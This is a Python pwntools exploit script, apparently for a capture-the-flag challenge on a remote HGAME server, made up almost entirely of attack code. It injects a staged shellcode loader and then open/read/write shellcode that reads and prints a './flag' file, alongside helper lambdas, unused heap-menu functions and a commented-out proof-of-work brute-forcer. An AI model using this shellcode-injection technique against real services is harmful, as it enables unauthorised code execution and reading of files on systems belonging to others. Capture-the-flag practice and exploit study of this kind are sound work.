# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('week-1.hgame.lwsec.cn',32527)
# libc = ELF('./libc-2.31.so')
#io = process('./vuln')
elf = ELF('./vuln')
#libc = ELF('./libc.so.6')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

#charset = string.printable
## charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 
#hash_code = io.recvuntil('\n', drop=True).decode().strip() 
## lg('hash_code')
#log.success('hash_code={}'.format(hash_code)) 
#passstr = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
#sla('pass:',passstr)

def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

#dbg()
#pause()
shellcode = asm( "xor rax,rax;mov dl,0x80;mov rsi,rdx;push rax;pop rdi;syscall;jmp rdx")
sla('input your shellcode:',shellcode)

shellcode = shellcraft.pushstr('./flag')
shellcode += shellcraft.open('rsp')
shellcode += shellcraft.read('rax','rsp',100)
shellcode += shellcraft.write(1,'rsp',100)

sn(asm(shellcode))
irt()


